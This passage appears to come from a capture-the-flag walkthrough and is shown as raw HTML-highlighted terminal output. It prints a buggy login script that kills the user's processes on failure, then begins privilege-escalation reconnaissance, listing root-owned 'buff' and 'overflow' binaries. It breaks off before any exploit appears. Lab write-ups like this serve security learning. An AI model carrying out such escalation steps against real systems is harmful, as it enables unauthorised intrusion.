&lt;span class="code-line"&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;programs&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;included&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Debian&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;free&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;software&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exact&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;distribution&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;terms&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;described&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;individual&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="o"&gt;/*/&lt;/span&gt;&lt;span class="n"&gt;copyright&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Debian&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;comes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ABSOLUTELY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;NO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WARRANTY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;extent&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;permitted&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;by&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;applicable&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;law&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Last&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Tue&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;57&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;2.15&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;READY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ACCESS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;THE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LAB&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;secret&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;CTraceback&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;most&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;recent&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;last&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/var/tmp/login.py&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;secret password : &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The program doesn't seems to work as intended:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;martin&lt;/span&gt;&lt;span class="nd"&gt;@debian&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#!/usr/bin/python&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;READY TO ACCESS THE SECRET LAB ? &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;secret password : &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;secretsec&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;secretlab&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WELCOME ! &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET OUT ! &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pkill -u &amp;#39;martin&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="privilege-elevation"&gt;Privilege elevation&lt;/h2&gt;
&lt;p&gt;As always a bit of reconnaissance is needed.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;martin&lt;/span&gt;&lt;span class="nv"&gt;@debian&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;alRh&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;hadi&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;avril&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bash_logout&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;avril&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bashrc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mai&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mai&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;148&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-------&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gdb_history&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;overflow&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mai&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;peda&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;session&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span 